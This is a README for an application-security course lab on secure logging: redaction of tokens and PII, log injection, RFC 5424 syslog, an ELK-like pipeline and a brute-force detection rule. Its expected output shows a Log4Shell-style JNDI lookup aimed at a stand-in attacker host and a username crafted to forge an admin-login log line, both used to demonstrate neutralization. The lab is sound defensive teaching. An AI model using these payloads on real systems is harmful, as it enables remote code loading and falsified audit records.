# Lab: Secure logging, RFC 5424 syslog and an ELK-like pipeline

**Course items:** "Implementing Sufficient Logging & Monitoring", "Secure Logging Implementation", "Logging Using Syslog Format", "Using ELK To Capture the Log Data". Lesson: [04 logging and monitoring](../../04-logging-and-monitoring.md). Real stack: [real-tools/elk-and-syslog.md](../../real-tools/elk-and-syslog.md). SIEM use of these logs: [cybersecurity-track 06](../../../../cybersecurity-track/06-siem-sentinel-splunk/README.md).

**Time:** 60 minutes. **Tests:** 9, all offline. **Safety:** in-memory index; tokens are FAKE and built at runtime. Only test systems you own or have written permission to test.

## Goal

Build the logging path of an API from the application to a searchable index, and make each step safe:

1. **Redact** secrets and mask PII before anything is written.
2. **Neutralize** CR/LF and lookup syntax so attackers cannot forge records (log injection) or trigger Log4Shell-style lookups.
3. Emit **RFC 5424** syslog with **structured data** (key/value pairs a machine can parse).
4. **Ship and parse** with an ELK-like pipeline, keep unparseable lines in a **dead-letter** queue, and **query** the index.
5. Write one **detection rule** (login brute force).

## Concept

[seclog.py](seclog.py):

| Function | Real-world equivalent |
|---|---|
| `redact()` | A logging filter / processor (structlog processor, Logback masking, Logstash `mutate`) |
| `naive_log_line()` vs `safe_log_line()` | `f"user={user}"` in a text log vs JSON logging with escaped values |
| `format_rfc5424()` / `parse_rfc5424()` | rsyslog/syslog-ng templates; Logstash `syslog` input; Elastic Agent |
| `Pipeline` | Logstash or Elastic Agent ingest pipeline (input → filter → output), mapping to ECS-style field names |
| `MiniIndex.query()` | Kibana KQL (`field:value AND ...`) |
| `detect_bruteforce()` | A Kibana/Elastic Security or SIEM correlation rule |

The structured-data id `audit@32473` uses 32473, the private enterprise number reserved for documentation examples (RFC 5612).

## Run

```text
.venv/Scripts/python appsec-course/15-implementing-api-security-mechanisms/labs/secure-logging-syslog-elk/demo.py
.venv/Scripts/python -m pytest appsec-course/15-implementing-api-security-mechanisms/labs/secure-logging-syslog-elk -v
```

## Expected output (real run)

```text
1. Redaction before writing
   raw     : {"event": "payment", "user": "asha.k@example.in", "authorization": "Bearer eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkp...
   redacted: {"event": "payment", "user": "a***@example.in", "authorization": "[REDACTED]", "card": "****1111", "note": "client sent token [REDACTED-JWT]", "amount": 499}

2. Log injection
   naive line(s):
     | 2026-11-19T10:00:04Z user=bob
     | 2026-11-19T10:00:05Z user=admin login success login failed
   safe line:
     | {"@timestamp": "2026-11-19T10:00:04Z", "user.name": "bob\\n2026-11-19T10:00:05Z user=admin login success", "message": "login failed"}
   lookup neutralized: $\{jndi:ldap://attacker.test/a}

3. RFC 5424 syslog
    <84>1 2026-11-19T10:00:00.000Z api-1 orders-api 4242 AUTHFAIL [audit@32473 action="login" outcome="failure" user="cfo" src="203.0.113.50" req="r-0"] login failed for "cfo"
    parsed: {'facility': 10, 'severity': 4, 'timestamp': '2026-11-19T10:00:00.000Z', 'host': 'api-1', 'app': 'orders-api', 'procid': '4242', 'msgid': 'AUTHFAIL', 'sd': {'audit@32473': {'action': 'login', 'outcome': 'failure', 'user': 'cfo', 'src': '203.0.113.50', 'req': 'r-0'}}, 'msg': 'login failed for "cfo"'}

4. ELK-like pipeline and queries
   indexed: 8 | dead-letter: ['this is not syslog']
   event.action:login AND event.outcome:failure -> 7 hits; by source.ip: {'203.0.113.50': 6, '198.51.100.4': 1}
   source.ip:203.0.113.* AND event.outcome:success -> ['r-6']
   detection: [{'rule': 'api-login-bruteforce', 'source.ip': '203.0.113.50', 'count': 6, 'first': '2026-11-19T10:00:00+00:00'}]
```

## Steps

1. Read the redacted event: the `authorization` key is removed by **name**, the JWT inside free text is removed by **pattern**, the card number is masked only because it passes the Luhn check.
2. Look at the naive log: an attacker-controlled username created a fake "admin login success" line. In an investigation, that line would mislead you.
3. Compute the PRI by hand: `authpriv` (10) × 8 + `warning` (4) = 84.
4. Query the index for `event.outcome:failure AND NOT source.ip:203.0.113.*`.
5. Add a detection rule: "a success after five or more failures from the same IP within 60 seconds" (possible successful brute force). This is the highest-value alert in the lab data.

## What you learned

- Log **who, what, when, where, outcome** for authentication, authorization failures, input validation failures, rate-limit hits and admin actions, with a request id. Never secrets, tokens, passwords or full card numbers.
- Line-oriented logs plus user input equals forged records. Use structured logs and escape control characters.
- RFC 5424 is the current syslog format (RFC 3164 is legacy BSD syslog); prefer TLS transport (RFC 5425) for syslog over networks.

## Run the real tool (hedged)

See [real-tools/elk-and-syslog.md](../../real-tools/elk-and-syslog.md): `logger --rfc5424 --sd-id ...` to send a test message, rsyslog forwarding, and an Elasticsearch + Kibana (or OpenSearch + Dashboards) stack in Docker on 127.0.0.1 for lab use. Check licences: Elasticsearch re-added an open-source AGPL option in 2024; OpenSearch is the AWS-led fork.
